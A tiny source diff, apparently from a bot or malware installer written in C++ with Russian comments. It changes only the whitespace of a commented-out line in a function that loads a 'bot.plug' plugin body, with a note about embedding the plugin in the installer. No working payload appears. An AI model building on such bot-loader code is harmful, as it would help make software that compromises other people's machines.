@@ -407,7 +407,7 @@ LPVOID GetBuiltinFakeDllBody(DWORD & Size)
 // Выделена отдельно, потому что возможно будем встраивать Bot.plug прямо в инсталер.
 LPVOID LoadBotPlugBody(const string& BotPlugName, DWORD & Size)
 {
-//	return File::ReadToBufferA("bot.plug", Size);
+	//return File::ReadToBufferA("bot.plug", Size);
 
 	string PlugName = BotPlugName;
 	STR::AnsiLowerCase(PlugName.t_str());
